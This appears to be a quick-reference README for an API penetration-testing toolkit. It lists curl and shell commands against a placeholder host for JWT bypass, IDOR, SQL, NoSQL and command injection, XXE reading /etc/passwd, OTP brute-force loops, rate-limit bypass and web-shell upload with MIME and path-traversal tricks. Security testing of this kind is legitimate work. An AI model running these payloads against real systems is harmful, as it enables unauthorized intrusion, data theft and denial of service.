# Quick Reference Guide - API Penetration Testing

## 🚀 Commands

### Basic Testing

```bash
# Full API pentest scan
python3 api_pentest_orchestrator.py http://api.target.com

# With authentication
python3 api_pentest_orchestrator.py http://api.target.com --token eyJ0eXAi...

# Verbose mode
python3 api_pentest_orchestrator.py http://api.target.com -v

# Custom output
python3 api_pentest_orchestrator.py http://api.target.com -o ./pentest_2024
```

## 📋 Attack Categories

### 1. Discovery & Enumeration
```bash
# Find API endpoints
ffuf -u http://api.target.com/FUZZ -w endpoints.txt

# Test HTTP methods
curl -X OPTIONS http://api.target.com/api/users -v

# Find Swagger/OpenAPI
curl http://api.target.com/swagger.json
curl http://api.target.com/api-docs
```

### 2. Authentication Attacks
```bash
# Analyze JWT token
jwt_tool TOKEN

# Try JWT none algorithm bypass
# Try weak secrets: 'secret', 'password', '123456'

# Login bypass
curl -X POST http://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
```

### 3. Authorization Attacks (IDOR/BOLA)
```bash
# Test IDOR
curl http://api.target.com/api/users/1
curl http://api.target.com/api/users/2
curl http://api.target.com/api/users/admin

# Check privilege escalation
curl -H "Authorization: Bearer TOKEN" \
  http://api.target.com/api/admin/users
```

### 4. Injection Attacks
```bash
# SQL Injection
curl "http://api.target.com/search?q=1' OR '1'='1"

# NoSQL Injection
curl -X POST http://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# Command injection
curl "http://api.target.com/exec?cmd=id; whoami"

# XXE injection
curl -X POST http://api.target.com/upload \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### 5. Business Logic Attacks
```bash
# Test payment bypass
curl -X POST http://api.target.com/checkout \
  -d '{"amount":0}'

# Test coupon abuse
curl -X POST http://api.target.com/apply_coupon \
  -d '{"code":"DISCOUNT50"}'

# Multiple concurrent claims (race condition)
ab -n 100 -c 50 http://api.target.com/api/claim
```

### 6. Mass Assignment
```bash
# Test admin field injection
curl -X POST http://api.target.com/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","isAdmin":true}'

# Test hidden field discovery
curl -X POST http://api.target.com/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","is_premium":true,"api_key":"injected"}'
```

### 7. Rate Limiting & DoS
```bash
# Test rate limit bypass with headers
for i in {1..100}; do
  curl -H "X-Forwarded-For: $i.0.0.0" \
    http://api.target.com/api/data
done

# OTP brute force
for otp in {000000..999999}; do
  curl -X POST http://api.target.com/verify \
    -d "{\"otp\":\"$otp\"}"
done

# Load testing
ab -n 1000 -c 50 http://api.target.com/api/data
```

### 8. GraphQL Attacks
```bash
# Introspection query
curl -X POST http://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name}}}"}'

# Deep recursion DoS
# Nested query with 10+ levels

# Field enumeration
curl -X POST http://api.target.com/graphql \
  -d '{"query":"query{user{password}}"}'
```

### 9. File Upload & Deserialization
```bash
# Upload malicious file
curl -F "file=@shell.php" http://api.target.com/upload

# MIME type bypass
curl -F "file=@shell.php;type=image/jpeg" \
  http://api.target.com/upload

# Path traversal
curl -F "file=@shell.php" \
  -F "path=../../" http://api.target.com/upload
```

### 10. Secrets & Token Abuse
```bash
# Scan for exposed secrets
grep -E 'AKIA|ghp_|sk_live_' responses.txt

# Test token reuse
curl -H "Authorization: Bearer TOKEN" \
  http://api.target.com/api/admin

# Cloud credential exposure
curl http://api.target.com/aws/credentials
curl http://api.target.com/gcp-credentials.json
```

## 🎯 Payloads

### Common Payload Files

Located in `/payloads/`:
- `sql_injection.txt`
- `nosql_injection.txt`
- `command_injection.txt`
- `xss_payloads.txt`
- `jwt_payloads.txt`
- `xxe_payloads.txt`

### Python Payload Generation

```python
from utils.request_builder import PayloadGenerator

# SQL injection
payloads = PayloadGenerator.sql_injection_payloads()

# NoSQL injection
payloads = PayloadGenerator.nosql_injection_payloads()

# Command injection
payloads = PayloadGenerator.command_injection_payloads()

# Authentication bypass
payloads = PayloadGenerator.authentication_bypass_payloads()

# JWT attacks
payloads = PayloadGenerator.jwt_payloads()

# XXE injection
payloads = PayloadGenerator.xxe_payloads()

# Mass assignment
payloads = PayloadGenerator.mass_assignment_payloads()
```

## 🔍 Testing Workflows

### Reconnaissance & Discovery
```bash
# Step 1: Basic info
curl -I http://api.target.com

# Step 2: Find endpoints
python3 -c "
from modules.discovery_enumeration import APIDiscoveryAnalyzer
analyzer = APIDiscoveryAnalyzer('http://api.target.com')
print(analyzer.discover_endpoints_ffuf())
"

# Step 3: Version detection
# Step 4: Swagger/OpenAPI
```

### Authentication Testing
```bash
# Test all auth vectors
python3 -c "
from modules.authentication_attacks import AuthenticationAttackAnalyzer
analyzer = AuthenticationAttackAnalyzer('http://api.target.com', 'TOKEN')
print(analyzer.analyze())
"
```

### Complete Pentest
```bash
python3 api_pentest_orchestrator.py http://api.target.com -o results_$(date +%s)
```

## 📊 Report Analysis

### Parse JSON Results
```bash
# View summary
cat results/pentest_summary.md

# View full report
cat results/pentest_report.json | jq '.summary'

# View vulnerabilities
cat results/pentest_report.json | jq '.vulnerabilities'
```

## 🔧 Tools Reference

| Task | Tool | Command |
|------|------|---------|
| Endpoint fuzzing | ffuf | `ffuf -u URL/FUZZ -w wordlist.txt` |
| SQL injection | sqlmap | `sqlmap -u "URL" --dbs` |
| JWT analysis | jwt-tool | `jwt_tool TOKEN -C` |
| Load testing | ab | `ab -n 1000 -c 50 URL` |
| GraphQL | InQL | Via Burp plugin |
| Proxy | mitmproxy | `mitmproxy -p 8080` |
| API calls | httpie | `http GET api.target.com` |

## 🔐 Authentication Examples

```bash
# Basic Auth
curl -u username:password http://api.target.com

# Bearer Token
curl -H "Authorization: Bearer TOKEN" http://api.target.com

# API Key
curl -H "X-API-Key: your_api_key" http://api.target.com

# Custom Header
curl -H "Authorization: ApiKey user:password" http://api.target.com
```

## ⚠️ Important Notes

1. **Only test authorized targets**
2. **Save all requests/responses**
3. **Document all findings**
4. **Follow responsible disclosure**
5. **Use VPN for remote testing**

## 📞 Troubleshooting

### SSL Certificate Issues
```bash
# Disable SSL verification (for testing only!)
curl -k https://api.target.com
python3 api_pentest_orchestrator.py https://api.target.com
```

### Rate Limiting
```bash
# Add delays between requests
import time
time.sleep(5)  # Wait 5 seconds
```

### Authentication Failures
```bash
# Verify token
curl -H "Authorization: Bearer TOKEN" \
  http://api.target.com/api/profile
```

---

**Complete workflow example:**
```bash
# 1. Install
bash install_dependencies.sh

# 2. Verify
python3 test_installation.py

# 3. Pentest
python3 api_pentest_orchestrator.py http://ctf-api.com --token xyz

# 4. Review
cat results/pentest_summary.md
```
